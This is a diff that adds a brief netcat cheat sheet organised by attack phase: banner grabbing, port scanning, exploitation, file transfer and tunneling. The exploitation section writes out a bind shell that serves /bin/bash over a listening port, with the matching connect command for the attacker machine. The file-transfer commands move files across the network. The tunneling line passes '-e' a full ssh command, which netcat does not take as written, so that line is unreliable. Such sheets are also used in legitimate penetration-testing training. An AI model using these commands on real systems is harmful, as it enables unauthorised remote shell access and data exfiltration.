@@ -1,1 +1,25 @@
+# Banner Grabbing
+nc -v <target_ip> <port>
 
+# Scanning
+nc -z -v -n -w1 <target_ip> 1-100
+
+# Vulnerability Analysis
+nc -v <target_ip> <port>
+
+# Exploitation
+On the target machine
+nc -l -p <listening_port> -e /bin/bash
+
+On the attacker machine
+nc <target_ip> <listening_port>
+
+# File Transfer
+On the receiving machine
+nc -l -p <listening_port> > received_file
+
+On the sending machine
+nc <target_ip> <listening_port> < file_to_send
+
+# Tunneling
+nc -l -p <listening_port> -e /usr/bin/ssh -i private_key user@localhost
